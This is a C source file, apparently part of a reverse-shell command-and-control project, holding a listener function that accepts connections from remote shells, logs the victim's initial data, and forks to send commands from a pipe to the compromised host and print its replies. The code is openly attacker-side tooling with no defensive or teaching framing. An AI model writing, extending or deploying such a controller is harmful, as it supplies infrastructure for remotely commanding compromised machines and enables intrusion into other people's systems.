#include "control_server.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

//socket stuff
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>

//signal stuff
#include <signal.h>

//reap children
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/stat.h>

#include "utils.h"
#include "networking.h"
#include "server.h"
#include "init_struct.h"

#define MESSAGE_LENGTH 2048


int listening_server_action(int new_socket, int readPipe){
  printf("ready to take command of the new reverse shell that just connected...\n");

  struct init_struct init;
  read(new_socket, &init, sizeof(struct  init_struct));
  printf("RECIEVED CONNECTION!...\n");
  print_init_struct(&init);
  int fds[2];
  pipe(fds);

  int forkResult = fork();

  // If cmld, read from listening server and write to socket
  if (forkResult == 0){
    while (1){
      char message[MESSAGE_LENGTH] = "ls";
      int readResult = read(readPipe, message, MESSAGE_LENGTH-1);

      strcat(message, "\n");

      int msg_size = (strlen(message)+1) * sizeof(char);

      int write_result=write(new_socket, message, msg_size);
      perror(write_result == -1?"WRITE TO SOCKET ERR":"kol tov");

      printf("message: %s %d\n", message, msg_size);
    }
  }
  // If parent, just read from socket
  else {
    while(1){
      char connection[MESSAGE_LENGTH] = "";
      int bytes;
      while(bytes = read(new_socket, connection, MESSAGE_LENGTH)){
        printf("\n<<CONNECTION>> %d: %s\n",bytes, connection);
        memset(connection, 0, sizeof(connection));
      }
    }
  }
  return 0;
}
